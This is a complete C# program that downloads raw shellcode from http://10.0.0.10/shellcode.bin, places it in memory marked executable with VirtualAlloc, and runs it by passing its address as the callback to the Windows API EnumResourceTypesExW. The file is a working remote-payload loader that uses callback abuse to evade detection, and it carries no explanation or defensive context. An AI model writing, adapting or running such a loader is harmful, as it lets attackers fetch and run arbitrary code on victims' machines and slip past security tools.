using System;
using System.Runtime.InteropServices;


namespace EnumResourceTypesExW
{
    internal class Program
    {
        static void Main(string[] args)
        {
            string url = "http://10.0.0.10/shellcode.bin";
            System.Net.WebClient client = new System.Net.WebClient();
            byte[] shellcode = client.DownloadData(url);

            IntPtr addr = VirtualAlloc(IntPtr.Zero, shellcode.Length, 0x3000, 0x40);
            Marshal.Copy(shellcode, 0, addr, shellcode.Length);

            EnumResourceTypesExW(IntPtr.Zero, addr, IntPtr.Zero, 0, 0);
            
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, int dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool EnumResourceTypesExW(IntPtr hModule, IntPtr lpEnumFrunc, IntPtr lParam, int dwFlags, int LangId);
    }
}
